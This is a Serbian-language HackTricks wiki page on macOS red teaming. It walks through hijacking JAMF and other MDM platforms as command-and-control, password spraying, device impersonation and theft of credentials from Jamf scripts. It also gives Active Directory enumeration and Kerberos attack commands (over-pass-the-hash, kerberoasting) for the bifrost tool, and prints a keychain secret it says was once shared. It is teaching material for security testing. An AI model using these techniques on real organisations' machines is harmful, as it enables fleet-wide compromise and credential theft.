# macOS Red Teaming

{{#include ../../banners/hacktricks-training.md}}


## Zloupotreba MDM-ova

- JAMF Pro: `jamf checkJSSConnection`
- Kandji

Ako uspete da **kompromitujete administratorske akreditive** za pristup upravljačkoj platformi, možete **potencijalno kompromitovati sve računare** distribuiranjem vašeg malvera na mašinama.

Za red teaming u MacOS okruženjima, veoma je preporučljivo imati razumevanje kako MDM-ovi funkcionišu:

{{#ref}}
macos-mdm/
{{#endref}}

### Korišćenje MDM-a kao C2

MDM će imati dozvolu da instalira, postavlja upite ili uklanja profile, instalira aplikacije, kreira lokalne administratorske naloge, postavlja firmware lozinku, menja FileVault ključ...

Da biste pokrenuli svoj MDM, potrebno je da **vaš CSR potpiše dobavljač** što možete pokušati da dobijete sa [**https://mdmcert.download/**](https://mdmcert.download/). A da biste pokrenuli svoj MDM za Apple uređaje, možete koristiti [**MicroMDM**](https://github.com/micromdm/micromdm).

Međutim, da biste instalirali aplikaciju na registrovanom uređaju, i dalje je potrebno da bude potpisana od strane developerskog naloga... međutim, prilikom registracije MDM-a, **uređaj dodaje SSL certifikat MDM-a kao pouzdan CA**, tako da sada možete potpisati bilo šta.

Da biste registrovali uređaj u MDM, potrebno je da instalirate **`mobileconfig`** datoteku kao root, koja može biti isporučena putem **pkg** datoteke (možete je kompresovati u zip, a kada se preuzme iz safarija, biće dekompresovana).

**Mythic agent Orthrus** koristi ovu tehniku.

### Zloupotreba JAMF PRO

JAMF može pokretati **prilagođene skripte** (skripte koje je razvio sysadmin), **nativne payload-e** (kreiranje lokalnog naloga, postavljanje EFI lozinke, praćenje datoteka/procesa...) i **MDM** (konfiguracije uređaja, sertifikati uređaja...).

#### JAMF samoregistracija

Idite na stranicu kao što je `https://<company-name>.jamfcloud.com/enroll/` da vidite da li imaju **omogućenu samoregistraciju**. Ako imaju, može **tražiti akreditive za pristup**.

Možete koristiti skriptu [**JamfSniper.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfSniper.py) da izvršite napad password spraying.

Štaviše, nakon pronalaženja odgovarajućih akreditiva, mogli biste biti u mogućnosti da brute-force-ujete druge korisničke naloge sa sledećim obrascem:

![](<../../images/image (107).png>)

#### JAMF autentifikacija uređaja

<figure><img src="../../images/image (167).png" alt=""><figcaption></figcaption></figure>

**`jamf`** binarni fajl sadržao je tajnu za otvaranje keychain-a koja je u vreme otkrića bila **deljena** među svima i bila je: **`jk23ucnq91jfu9aj`**.\
Štaviše, jamf **persistira** kao **LaunchDaemon** u **`/Library/LaunchAgents/com.jamf.management.agent.plist`**

#### JAMF preuzimanje uređaja

**JSS** (Jamf Software Server) **URL** koji će **`jamf`** koristiti nalazi se u **`/Library/Preferences/com.jamfsoftware.jamf.plist`**.\
Ova datoteka u suštini sadrži URL:
```bash
plutil -convert xml1 -o - /Library/Preferences/com.jamfsoftware.jamf.plist

[...]
<key>is_virtual_machine</key>
<false/>
<key>jss_url</key>
<string>https://halbornasd.jamfcloud.com/</string>
<key>last_management_framework_change_id</key>
<integer>4</integer>
[...]
```
Dakle, napadač bi mogao da postavi zlonamerni paket (`pkg`) koji **prepisuje ovu datoteku** prilikom instalacije postavljajući **URL na Mythic C2 slušalac iz Typhon agenta** kako bi sada mogao da zloupotrebi JAMF kao C2.
```bash
# After changing the URL you could wait for it to be reloaded or execute:
sudo jamf policy -id 0

# TODO: There is an ID, maybe it's possible to have the real jamf connection and another one to the C2
```
#### JAMF Impersonacija

Da biste **imitirali komunikaciju** između uređaja i JMF-a, potrebno je:

- **UUID** uređaja: `ioreg -d2 -c IOPlatformExpertDevice | awk -F" '/IOPlatformUUID/{print $(NF-1)}'`
- **JAMF ključanica** iz: `/Library/Application\ Support/Jamf/JAMF.keychain` koja sadrži sertifikat uređaja

Sa ovom informacijom, **napravite VM** sa **ukradenim** Hardver **UUID** i sa **onemogućenim SIP**, prebacite **JAMF ključanicu,** **hook**-ujte Jamf **agent** i ukradite njegove informacije.

#### Krađa tajni

<figure><img src="../../images/image (1025).png" alt=""><figcaption><p>a</p></figcaption></figure>

Takođe možete pratiti lokaciju `/Library/Application Support/Jamf/tmp/` za **prilagođene skripte** koje administratori možda žele da izvrše putem Jamf-a, jer su **ovde smeštene, izvršene i uklonjene**. Ove skripte **mogu sadržati kredencijale**.

Međutim, **kredencijali** se mogu proslediti ovim skriptama kao **parametri**, pa biste trebali pratiti `ps aux | grep -i jamf` (čak i bez root privilegija).

Skripta [**JamfExplorer.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfExplorer.py) može slušati nove datoteke koje se dodaju i nove argumente procesa.

### macOS Daljinski pristup

I takođe o **MacOS** "posebnim" **mrežnim** **protokolima**:

{{#ref}}
../macos-security-and-privilege-escalation/macos-protocols.md
{{#endref}}

## Active Directory

U nekim slučajevima ćete otkriti da je **MacOS računar povezan na AD**. U ovom scenariju trebali biste pokušati da **enumerišete** aktivni direktorijum kao što ste navikli. Pronađite neku **pomoć** na sledećim stranicama:

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/
{{#endref}}

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/
{{#endref}}

Neki **lokalni MacOS alat** koji vam takođe može pomoći je `dscl`:
```bash
dscl "/Active Directory/[Domain]/All Domains" ls /
```
Takođe, postoje neki alati pripremljeni za MacOS koji automatski enumerišu AD i igraju se sa kerberosom:

- [**Machound**](https://github.com/XMCyber/MacHound): MacHound je ekstenzija za Bloodhound alat za reviziju koja omogućava prikupljanje i unos odnosa Active Directory na MacOS hostovima.
- [**Bifrost**](https://github.com/its-a-feature/bifrost): Bifrost je Objective-C projekat dizajniran za interakciju sa Heimdal krb5 API-ima na macOS-u. Cilj projekta je omogućiti bolje testiranje bezbednosti oko Kerberosa na macOS uređajima koristeći nativne API-je bez potrebe za bilo kojim drugim okvirom ili paketima na cilju.
- [**Orchard**](https://github.com/its-a-feature/Orchard): JavaScript za automatizaciju (JXA) alat za izvršavanje enumeracije Active Directory.

### Informacije o domeni
```bash
echo show com.apple.opendirectoryd.ActiveDirectory | scutil
```
### Korisnici

Tri tipa MacOS korisnika su:

- **Lokalni korisnici** — Upravlja ih lokalna OpenDirectory usluga, nisu na bilo koji način povezani sa Active Directory.
- **Mrežni korisnici** — Nestabilni Active Directory korisnici koji zahtevaju vezu sa DC serverom za autentifikaciju.
- **Mobilni korisnici** — Active Directory korisnici sa lokalnom rezervnom kopijom svojih kredencijala i datoteka.

Lokalne informacije o korisnicima i grupama se čuvaju u folderu _/var/db/dslocal/nodes/Default._\
Na primer, informacije o korisniku pod imenom _mark_ se čuvaju u _/var/db/dslocal/nodes/Default/users/mark.plist_ a informacije o grupi _admin_ su u _/var/db/dslocal/nodes/Default/groups/admin.plist_.

Pored korišćenja HasSession i AdminTo ivica, **MacHound dodaje tri nove ivice** u Bloodhound bazu podataka:

- **CanSSH** - entitet kojem je dozvoljeno SSH na host
- **CanVNC** - entitet kojem je dozvoljeno VNC na host
- **CanAE** - entitet kojem je dozvoljeno izvršavanje AppleEvent skripti na host
```bash
#User enumeration
dscl . ls /Users
dscl . read /Users/[username]
dscl "/Active Directory/TEST/All Domains" ls /Users
dscl "/Active Directory/TEST/All Domains" read /Users/[username]
dscacheutil -q user

#Computer enumeration
dscl "/Active Directory/TEST/All Domains" ls /Computers
dscl "/Active Directory/TEST/All Domains" read "/Computers/[compname]$"

#Group enumeration
dscl . ls /Groups
dscl . read "/Groups/[groupname]"
dscl "/Active Directory/TEST/All Domains" ls /Groups
dscl "/Active Directory/TEST/All Domains" read "/Groups/[groupname]"

#Domain Information
dsconfigad -show
```
Više informacija na [https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/](https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/)

### Computer$ lozinka

Dobijte lozinke koristeći:
```bash
bifrost --action askhash --username [name] --password [password] --domain [domain]
```
Moguće je pristupiti **`Computer$`** lozinki unutar System keychain-a.

### Over-Pass-The-Hash

Dobijte TGT za specifičnog korisnika i uslugu:
```bash
bifrost --action asktgt --username [user] --domain [domain.com] \
--hash [hash] --enctype [enctype] --keytab [/path/to/keytab]
```
Kada se TGT prikupi, moguće je ubrizgati ga u trenutnu sesiju sa:
```bash
bifrost --action asktgt --username test_lab_admin \
--hash CF59D3256B62EE655F6430B0F80701EE05A0885B8B52E9C2480154AFA62E78 \
--enctype aes256 --domain test.lab.local
```
### Kerberoasting
```bash
bifrost --action asktgs --spn [service] --domain [domain.com] \
--username [user] --hash [hash] --enctype [enctype]
```
Sa dobijenim servisnim tiketima moguće je pokušati pristupiti deljenjima na drugim računarima:
```bash
smbutil view //computer.fqdn
mount -t smbfs //server/folder /local/mount/point
```
## Pristupanje Keychain-u

Keychain verovatno sadrži osetljive informacije koje, ako se pristupi bez generisanja prompta, mogu pomoći u napredovanju red team vežbe:

{{#ref}}
macos-keychain.md
{{#endref}}

## Eksterne usluge

MacOS Red Teaming se razlikuje od regularnog Windows Red Teaming-a jer je obično **MacOS integrisan sa nekoliko eksternih platformi direktno**. Uobičajena konfiguracija MacOS-a je pristup računaru koristeći **OneLogin sinhronizovane akreditive, i pristupanje nekoliko eksternih usluga** (kao što su github, aws...) putem OneLogin-a.

## Razne Red Team tehnike

### Safari

Kada se fajl preuzme u Safariju, ako je to "siguran" fajl, biće **automatski otvoren**. Na primer, ako **preuzmete zip**, biće automatski raspakovan:

<figure><img src="../../images/image (226).png" alt=""><figcaption></figcaption></figure>

## Reference

- [**https://www.youtube.com/watch?v=IiMladUbL6E**](https://www.youtube.com/watch?v=IiMladUbL6E)
- [**https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6**](https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6)
- [**https://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0**](https://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0)
- [**Come to the Dark Side, We Have Apples: Turning macOS Management Evil**](https://www.youtube.com/watch?v=pOQOh07eMxY)
- [**OBTS v3.0: "An Attackers Perspective on Jamf Configurations" - Luke Roberts / Calum Hall**](https://www.youtube.com/watch?v=ju1IYWUv4ZA)


{{#include ../../banners/hacktricks-training.md}}
